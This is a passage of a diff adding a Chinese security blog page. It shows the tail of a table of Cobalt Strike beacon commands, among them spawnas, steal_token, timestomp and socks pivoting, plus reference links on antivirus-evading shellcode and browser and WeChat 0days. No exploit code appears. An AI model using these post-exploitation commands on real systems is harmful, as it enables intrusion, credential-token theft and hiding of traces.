class="string">设置信标睡眠时间</span></span><br><span class="line"><span class="attr">socks</span>                            <span class="string">启动SOCKS4a服务器来中继流量。</span></span><br><span class="line"><span class="attr">socks</span>                            <span class="string">停止SOCKS4a服务器</span></span><br><span class="line"><span class="attr">spawn</span>                            <span class="string">产生一个会话</span></span><br><span class="line"><span class="attr">spawnas</span>                          <span class="string">以另一个用户的身份生成一个会话</span></span><br><span class="line"><span class="attr">spawnto</span>                          <span class="string">设置可执行文件以将进程生成到</span></span><br><span class="line"><span class="attr">spawnu</span>                           <span class="string">在另一个进程下生成一个会话</span></span><br><span class="line"><span class="attr">spunnel</span>                          <span class="string">通过 rportfwd 生成和隧道代理。</span></span><br><span class="line"><span class="attr">spunnel_local</span>                    <span class="string">通过Cobalt Strike客户端rportfwd生成和挖掘一个代理。</span></span><br><span class="line"><span class="attr">ssh</span>                              <span class="string">使用SSH在主机上生成一个SSH会话。</span></span><br><span class="line"><span class="attr">sshkey</span>                           <span class="string">使用SSH在主机上生成一个SSH会话。</span></span><br><span class="line"><span class="attr">steal_token</span>                      <span class="string">从进程中窃取访问令牌</span></span><br><span class="line"><span class="attr">timestomp</span>                        <span class="string">将时间戳从一个文件应用到另一个文件</span></span><br><span class="line"><span class="attr">unlink</span>                           <span class="string">断开与母信标的连接</span></span><br><span class="line"><span class="attr">upload</span>                           <span class="string">上传文件</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/tqydyqt/article/details/113831533" target="_blank" rel="noopener">【Windows】Shellcode免杀，过360、火绒、Defender 静态及主防</a><br><a href="https://www.bugfor.com/vuls/vulnerability/6962.html" target="_blank" rel="noopener">微信 RCE 0day</a><br><a href="https://mp.weixin.qq.com/s/V9rujv89_P0FGhBCfw21mw" target="_blank" rel="noopener">chrome(最新版可用) 0day上线cs &amp; wx 0day上线</a><br><a href="https://mp.weixin.qq.com/s/3LZ_cj2gDC1bQATxqBfweg" target="_blank" rel="noopener">远控免杀专题文章(1)-基础篇</a><br><a href="http://blog.zhangkexuan.cn/2020/11/09/msf01-windows-meterpreter-reverse-tcp/" target="_blank" rel="noopener">Metasploit(1):记录一次Win10的渗透过程</a></p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://github.com/knownsec/shellcodeloader" target="_blank" rel="noopener">shellcodeloader</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WEB/" rel="tag"># WEB</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/" rel="prev" title="纵横杯CTF-WEB两题">
+      <i class="fa fa-chevron-left"></i> 纵横杯CTF-WEB两题
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/18/Linux%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/" rel="next" title="Linux痕迹清理">
+      Linux痕迹清理 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="comments"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#具体思路"><span class="nav-number">1.</span> <span class="nav-text">具体思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSF权限维持"><span class="nav-number">2.</span> <span class="nav-text">MSF权限维持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WeChat-0day上线"><span class="nav-number">3.</span> <span class="nav-text">WeChat 0day上线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#meterpreter命令详解"><span class="nav-number">4.</span> <span class="nav-text">meterpreter命令详解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cobaltstrike-beacon详解"><span class="nav-number">5.</span> <span class="nav-text">Cobaltstrike beacon详解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#工具"><span class="nav-number">7.</span> <span class="nav-text">工具</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChenZIDu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">ChenZIDu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">58</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chenzidu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chenzidu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:oinsm@outlook.com" title="E-Mail → mailto:oinsm@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ChenZIDu1" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ChenZIDu1" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.loongten.com/" title="https:&#x2F;&#x2F;www.loongten.com&#x2F;" rel="noopener" target="_blank">Keac's</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hsnico.github.io/" title="https:&#x2F;&#x2F;hsnico.github.io" rel="noopener" target="_blank">Hsnico'blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.suk1.top/" title="https:&#x2F;&#x2F;www.suk1.top&#x2F;" rel="noopener" target="_blank">晓黑</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.dreams-wj.top/" title="https:&#x2F;&#x2F;blog.dreams-wj.top" rel="noopener" target="_blank">HKer_YM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ncsec.cn/" title="https:&#x2F;&#x2F;blog.ncsec.cn&#x2F;" rel="noopener" target="_blank">RoarNya</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChenZIDu</span>
+</div>
+  <div class="powered-by">Oinsm
+    
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Web – <a href="https://github.com/ChenZIDu" rel="noopener" target="_blank">🙂</a>
+    
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 'Kp900xxAQMLq3K0AkgqsPzcV-gzGzoHsz',
+    appKey: 'XdnaoJVs9feaETzUFPUq79tD',
+    placeholder: "Just go go",
+    avatar: 'robohash',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: true,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
